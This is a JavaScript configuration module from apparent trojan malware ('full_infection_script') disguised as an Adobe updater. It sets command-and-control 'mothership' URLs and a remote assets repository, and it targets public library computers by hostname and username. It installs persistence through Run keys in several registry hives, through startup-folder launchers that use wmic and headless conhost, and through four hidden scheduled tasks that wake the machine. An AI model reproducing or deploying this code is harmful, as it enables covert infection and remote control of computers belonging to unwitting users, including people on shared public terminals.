const path = require("path");
const helper = require("./adobeupdate.helper.js");

var mothershipconfig = {

    get mothershipconfigfpath() {
        return path.join(systemconfig.trojandir, "mothership");
    },

    mothershipindex: -1,

    get mothership() {
        if (this.mothershipindex < 0) return this.selectMothership();

        return this.mothershiplist[this.mothershipindex];
    },

    get mothershipassets() {
        return "https://raw.githubusercontent.com/owd842/mothershipassets/master";
    },

    mothershiplist: [
        "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault",
    ],

    selectMothership: function () {
        let mothershiparr = this.mothershiplist;

        let mothershipurl = "";

        if ( helper.fileExists(this.mothershipconfigfpath) ) {
            mothershipurl = helper.readTag(this.mothershipconfigfpath);

            if (!helper.isNullOrWhitespace(mothershipurl)) {
                for (let i = 0; i <= mothershiparr.length; i++) {
                    if (mothershiparr[i] == mothershipurl) {
                        this.mothershipindex = i;
                        return mothershipurl;
                    }
                }
            }
        }

        let count = mothershiparr.length;

        if (this.mothershipindex < -1 || this.mothershipindex == count - 1) {
            this.mothershipindex = 0;
        } else {
            this.mothershipindex++;
        }

        mothershipurl = mothershiparr[this.mothershipindex];

        helper.writeTag(this.mothershipconfigfpath, mothershipurl);

        helper.logmsg(
            `index: ${this.mothershipindex} -- mothership: ${mothershipurl}`
        );

        return mothershipurl;
    },
};

// TODO move mothership config details to mothershipconfig
var systemconfig = {

    // TODO reconcile machinename, username, userid

    // all TPLs have the same machinename, hostname
    // TODO SJPCP --> st. james
    //      RLPCP --> yonge/bloor reference library
    //      username should be ADULT2022
    get istpl() {
        let machineprefix = this.machinename.toLowerCase().substring(0, 5);

        if ( [ "ADULT2022", "LC2022", "CAT2022" ].includes(this.username.toUpperCase()) ) {
            return true;
        }

        if (
            machineprefix == "RLPCP".toLowerCase() ||
            machineprefix == "SJPCP".toLowerCase()
        ) {
            return true;
        }

        if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
            return true;
        }

        return false;
    },

    staticdelay: 30,
    trojanname: "owd",
    script_version: "full_infection_script",

    get trojandir() {
        if (systemconfig.istpl) {
            return path.join(process.env.ProgramData, this.trojanname);
        }

        return path.join(os.tmpdir(), this.trojanname);
    },

    get launch_script_fname() {
        return "launch.cmd";
    },

    get launch_script_fpath() {
        return path.join(this.trojandir, this.launch_script_fname);
    },

    get cmdname() {
        let tcmdname = process_argv.length >= 3 ? process_argv[2] : "watchdog";

        if (tcmdname == "launch_ping") tcmdname = "watchdog";

        return tcmdname;
    },

    __cmdconfig: null,

    get cmdconfig() {
        if (this.__cmdconfig) return this.__cmdconfig;

        this.__cmdconfig = new CmdConfig(this.cmdname);
        return this.__cmdconfig;
    },

    get cmdtaskname() {
        return this.cmdconfig.cmdtaskname;
    },

    getClientJobPath() {
        return path.join(systemconfig.trojandir, "clientjob_" + getRandomCode(8));
    },

    getClientJobConfigPath() {
        return path.join(
            this.trojandir,
            "clientjobconfig_" + getRandomCode(8) + ".json"
        );
    },

    // TODO: read from file
    // S-1-5-21-3127389091-2830476002-349640086-1001
    // used for reg trigger mechanism
    __usersid: "",

    get usersid() {
        return this.__usersid;
    },

    set usersid(value) {
        this.__usersid = value;
    },

    __clientid: "",

    get clientid() {
        if (isNullOrWhitespace(this.__clientid)) {
            if (fileExists(systemconfig.clientidfpath))
                this.__clientid = readTag(systemconfig.clientidfpath);
        }

        if (isNullOrWhitespace(this.__clientid)) {
            this.__clientid = getRandomCode(8);
            writeTag(systemconfig.clientidfpath, this.__clientid);
        }

        return this.__clientid;
    },

    get clientidfpath() {
        return path.join(this.trojandir, "client_id");
    },

    get pcmondir() {
        return path.join(this.trojandir, "pcmon");
    },

    get pspcmondir() {
        return path.join(this.trojandir, "pcmon");
    },

    get nodefolder() {
        return "node-v26.4.0-win-x64";
    },

    get nodeexedir() {
        return path.join(this.nodedir, this.nodefolder);
    },

    get nodeexepath() {
        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe"; //path.join(this.nodeexedir, "node.exe");
    },

    get nodedir() {
        return "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs"; //path.join(this.trojandir, "node");
    },

    get nodegsdfilesdir() {
        return path.join(this.nodedir, "gsd_files");
    },

    get gsdfilesdir() {
        return path.join(this.pythondir, "gsd_files");
    },

    get pythondir() {
        return path.join(this.trojandir, "python");
    },

    get pythonexedir() {
        return path.join(
            systemconfig.pythondir,
            "work",
            "Portable Python-3.10.5 x64",
            "App",
            "Python"
        );
    },

    get pythonexepath() {
        return path.join(systemconfig.pythonexedir, "python.exe");
    },

    get trojandir() {
        if (this.istpl) {
            return path.join(process.env.ProgramData, this.trojanname);
        }

        return path.join(os.tmpdir(), this.trojanname);
    },

    get trojanfname() {
        return "adobeupdate";
    },

    get trojanfpath() {
        return path.join(this.trojandir, this.trojanfname);
    },

    get scriptparentpid() {
        return process.ppid;
    },

    get scriptpid() {
        return process.pid;
    },

    get scriptfpath() {
        return process_argv[1];
    },

    get scriptdir() {
        return path.dirname(this.scriptfpath);
    },

    get machinename() {
        return os.hostname();
    },

    get username() {
        let uinfo = os.userInfo();
        return uinfo.username;
    },

    get source() {
        return path.basename(this.scriptfpath);
    },

    scriptts: getTimestamp(),
    __scriptmd5: "",
    get scriptmd5() {
        if (isNullOrWhitespace(this.__scriptmd5))
            this.__scriptmd5 = getFileMD5(this.scriptfpath);

        return this.__scriptmd5;
    },

    __sessionid: getRandomCode(8),

    get sessionid() {
        return this.__sessionid;
    },

    get logfpath() {
        return path.join(
            this.trojandir,
            "master_" +
            this.cmdname +
            (!isNullOrWhitespace(this.cmdtaskname)
                ? "_" + this.cmdtaskname
                : "") +
            "_" +
            this.scriptts +
            ".log"
        );
    },

    get lockfname() {
        return this.cmdconfig.lockfname;
    },

    get statekvp() {
        return {
            clientid: this.clientid,
            sessionid: this.sessionid,
            script_version: this.script_version,
            source: this.source,
            scriptts: this.scriptts,
            machinename: this.machinename,
            username: this.username,
            scriptmd5: this.scriptmd5,
        };
    },

    get statestr() {
        return `cmdname=${this.cmdname} cmdtaskname=${this.cmdtaskname} ts=${this.scriptts} pid=${this.scriptpid} ppid=${this.scriptparentpid}`;
    },
};

var taskconfig = {
    tasks: [
        {
            name: "adobeupdate_IdleTask",
            enabled: true,
            taskfunc: getIdleTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_RepTask",
            enabled: true,
            taskfunc: getRepTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_TimeTask",
            enabled: true,
            taskfunc: getTimeTaskXMLStr,
            tasktime: 1,
        },
        {
            name: "adobeupdate_DailyTask",
            enabled: true,
            taskfunc: getDailyTaskXMLStr,
            tasktime: 1,
        },
    ],

    getTaskTime(taskname) {
        for (const task of this.tasks) {
            if (task.name == taskname) return task.tasktime;
        }
        return -1;
    },

    getTaskXMLFunc(taskname) {
        for (const task of this.tasks) {
            if (task.name == taskname) {
                return task.taskfunc;
            }
        }
    },

    get tasknames() {
        let arr = [];

        for (const task of this.tasks) {
            arr.push(task.name);
        }

        return arr;
    },
};

var regstartupconfig = {
    get new_item_str() {
        return "New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType String -Force";
    },

    get new_drive_tag() {
        return `New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS`;
    },

    get_startup_script(reg_obj) {
        let txt = "";
        txt = regstartupconfig.get_name_value_str(reg_obj) + "\r\n";
        txt += `$RegistryPath = "${reg_obj.path}"` + "\r\n";
        txt += regstartupconfig.new_item_str;

        if (["startup_hku", "startup_hku_default"].includes(reg_obj.name)) {
            return regstartupconfig.new_drive_tag + "\r\n" + txt;
        }

        return txt;
    },

    get_startup_value(reg_obj) {
        let tpath = path.join(systemconfig.trojandir, systemconfig.launch_script_fname);
        return `conhost.exe --headless ${tpath} ${reg_obj.name}`;
    },

    get_name_value_str(reg_obj) {
        return (
            `$Name = "adobeupdate_startup"` +
            "\r\n" +
            `$Value = "${regstartupconfig.get_startup_value(reg_obj)}"` +
            "\r\n"
        );
    },

    get reg_paths() {
        let paths = [];

        for (const reg of regstartupconfig.regs) {
            if (!systemconfig.istpl || reg.name != "starup_hku_default")
                paths.push(reg.path);
        }

        return paths;
    },

    regs: [
        {
            name: "startup_hku",
            get path() {
                return `HKU:\\${systemconfig.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
            },
            enabled: true,
        },
        {
            name: "startup_hkcu",
            path: `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`,
            enabled: true,
        },
        {
            name: "startup_hklm",
            path: "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            enabled: true,
        },
        {
            name: "startup_hku_default",
            path: "HKU:\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            enabled: true,
        },
    ],
};

var startupfolderconfig = {
    get launcher_fname() {
        return "adobeupdate.cmd";
    },

    getFolder(foldername) {
        this.folders.forEach((folder) => {
            if (folder.name == foldername) return folder;
        });
    },

    getScriptPath(foldername) {
        return path.join(this.getFolderPath(foldername), this.launcher_fname);
    },

    getFolderPath(foldername) {
        for (const folder of this.folders) {
            if (folder.name == foldername) {
                return folder.folderpath;
            }
        }
    },

    getLauncherScript(foldername) {
        let pre = "@echo off" + "\r\n";
        return (
            pre +
            `start "" /min wmic process call create "conhost.exe --headless ${systemconfig.launch_script_fpath} ${foldername}"`
        );
    },

    get foldernames() {
        let tfoldernames = [];

        this.folders.forEach((folder) => {
            tfoldernames.push(folder.name);
        });

        return tfoldernames;
    },

    get folderpaths() {
        let tfolderpaths = [];

        this.folders.forEach((folder) => {
            tfolderpaths.push(folder.folderpath);
        });

        return tfolderpaths;
    },

    get folders() {
        if (systemconfig.istpl) {
            return startupfolderconfig.tpl_folders;
        } else {
            return startupfolderconfig.client_folders;
        }
    },

    client_folders: [
        {
            enabled: true,
            name: "startup_activeusers",
            folderpath: `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
        },
        {
            enabled: true,
            name: "startup_allusers",
            folderpath:
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },
    ],

    tpl_folders: [
        {
            enabled: true,
            name: "startup_allusers",
            folderpath:
                "C:\\Users\\All Users\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },

        {
            enabled: true,
            name: "startup_profile",
            folderpath:
                "C:\\ProgramData\\MandatoryProfile\\Mandatory.V6\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        },

        {
            enabled: true,
            name: "startup_user",
            folderpath:
                `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
        },
    ],
};

function getIdleTaskXMLStr(
    intaskname,
    tasktimestr,
    tskxmltime,
    pexe,
    args,
    workdir
) {
    // tasktimestr --> 2005-01-01T00:08:00
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16" ?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <IdleTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
            </IdleTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <Duration>PT${tskxmltime}M</Duration>
                <WaitTimeout>PT1H</WaitTimeout>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
            <Exec>
                <Command>${pexe}</Command>
                <Arguments>${args}</Arguments>
                <WorkingDirectory>${workdir}</WorkingDirectory>
            </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

function getRepTaskXMLStr(
    intaskname,
    tasktimestr,
    tskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16" ?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
            <RegistrationInfo>
                <Date>2026-04-26T09:45:36.6514157</Date>
                <Author>test</Author>
                <URI>${intaskname}</URI>
            </RegistrationInfo>
            <Triggers>
                <CalendarTrigger>
                    <StartBoundary>${tasktimestr}</StartBoundary>
                    <Repetition>
                        <Interval>PT${tskxmltime}M</Interval>
                        <StopAtDurationEnd>false</StopAtDurationEnd>
                    </Repetition>
                    <ScheduleByDay>
                        <DaysInterval>1</DaysInterval>
                    </ScheduleByDay>
                </CalendarTrigger>
            </Triggers>
            <Settings>
                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                <AllowHardTerminate>false</AllowHardTerminate>
                <StartWhenAvailable>true</StartWhenAvailable>
                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                <IdleSettings>
                    <StopOnIdleEnd>false</StopOnIdleEnd>
                    <RestartOnIdle>false</RestartOnIdle>
                </IdleSettings>
                <AllowStartOnDemand>true</AllowStartOnDemand>
                <Enabled>true</Enabled>
                <Hidden>true</Hidden>
                <RunOnlyIfIdle>false</RunOnlyIfIdle>
                <WakeToRun>true</WakeToRun>
                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                <Priority>7</Priority>
            </Settings>
            <Actions Context="Author">
                <Exec>
                    <Command>${pexe}</Command>
                    <Arguments>${args}</Arguments>
                    <WorkingDirectory>${workdir}</WorkingDirectory>
                </Exec>
            </Actions>
        </Task>`;

    return taskxmlstr;
}

function getTimeTaskXMLStr(
    intaskname,
    tasktimestr,
    timetaskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <?xml version="1.0" encoding="UTF-16"?>
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <TimeTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
                <Repetition>
                <Interval>PT${timetaskxmltime}M</Interval>
                </Repetition>
                <RandomDelay>PT30S</RandomDelay>
            </TimeTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
        <Exec>
            <Command>${pexe}</Command>
            <Arguments>${args}</Arguments>
            <WorkingDirectory>${workdir}</WorkingDirectory>
        </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

function getDailyTaskXMLStr(
    intaskname,
    tasktimestr,
    timetaskxmltime,
    pexe,
    args,
    workdir
) {
    let taskxmlstr = `
        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
        <RegistrationInfo>
            <Date>2026-04-26T09:45:36.6514157</Date>
            <Author>test</Author>
            <URI>${intaskname}</URI>
        </RegistrationInfo>
        <Triggers>
            <CalendarTrigger>
                <StartBoundary>${tasktimestr}</StartBoundary>
                <Enabled>true</Enabled>
                <ScheduleByDay>
                    <DaysInterval>${timetaskxmltime}</DaysInterval>
                </ScheduleByDay>
            </CalendarTrigger>
        </Triggers>
        <Settings>
            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
            <AllowHardTerminate>false</AllowHardTerminate>
            <StartWhenAvailable>true</StartWhenAvailable>
            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
            <IdleSettings>
                <StopOnIdleEnd>false</StopOnIdleEnd>
                <RestartOnIdle>false</RestartOnIdle>
            </IdleSettings>
            <AllowStartOnDemand>true</AllowStartOnDemand>
            <Enabled>true</Enabled>
            <Hidden>true</Hidden>
            <RunOnlyIfIdle>false</RunOnlyIfIdle>
            <WakeToRun>true</WakeToRun>
            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
            <Priority>7</Priority>
        </Settings>
        <Actions Context="Author">
            <Exec>
                <Command>${pexe}</Command>
                <Arguments>${args}</Arguments>
                <WorkingDirectory>${workdir}</WorkingDirectory>
            </Exec>
        </Actions>
        </Task>`;

    return taskxmlstr;
}

module.exports = {
    systemconfig
};
